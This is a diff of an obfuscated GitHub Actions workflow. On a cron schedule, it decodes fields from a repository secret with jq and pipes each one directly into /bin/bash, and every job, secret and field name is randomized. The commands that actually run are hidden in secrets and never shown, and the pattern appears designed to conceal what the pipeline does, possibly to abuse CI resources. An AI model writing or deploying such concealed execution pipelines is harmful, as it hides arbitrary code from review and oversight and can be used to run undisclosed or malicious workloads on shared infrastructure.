@@ -1,9 +1,9 @@
 name: yanfusu1932
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 3/6 * * *'
+    - cron: '46 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: yanfusu1932
         env:
-          kqw85: ${{ secrets.kqw85 }}
+          dx0479: ${{ secrets.dx0479 }}
         run: |
-          echo $kqw85 | jq -r .ub355 | /bin/bash
-          echo $qm611 | jq -r .p9096 | /bin/bash
-          echo $dxt7 | jq -r .ooftr186 | /bin/bash
-          echo $v077 | jq -r .qhbmc31 | /bin/bash
-          echo $t342 | jq -r .oghz622 | /bin/bash
-          echo $camz280 | jq -r .udp99001 | /bin/bash
-          echo $umge0887 | jq -r .evvwc9268 | /bin/bash
-          echo $mmpg7 | jq -r .lz37 | /bin/bash
+          echo $dx0479 | jq -r .obdcf89 | /bin/bash
+          echo $bzbz33074 | jq -r .y3450 | /bin/bash
+          echo $ffzwn1500 | jq -r .w0517 | /bin/bash
+          echo $dv77 | jq -r .a338 | /bin/bash
+          echo $qzi37825 | jq -r .y0 | /bin/bash
+          echo $dzfda777 | jq -r .lzsj43 | /bin/bash
+          echo $ej18408 | jq -r .nuhtu23173 | /bin/bash
+          echo $qeekd5 | jq -r .bygx1392 | /bin/bash
+          echo $z648 | jq -r .i4050 | /bin/bash
+          echo $va220 | jq -r .fi2484 | /bin/bash
+          echo $rfbcm825 | jq -r .xihm2292 | /bin/bash
+          echo $r120 | jq -r .p9087 | /bin/bash
+          echo $sahvd3 | jq -r .q486 | /bin/bash
 
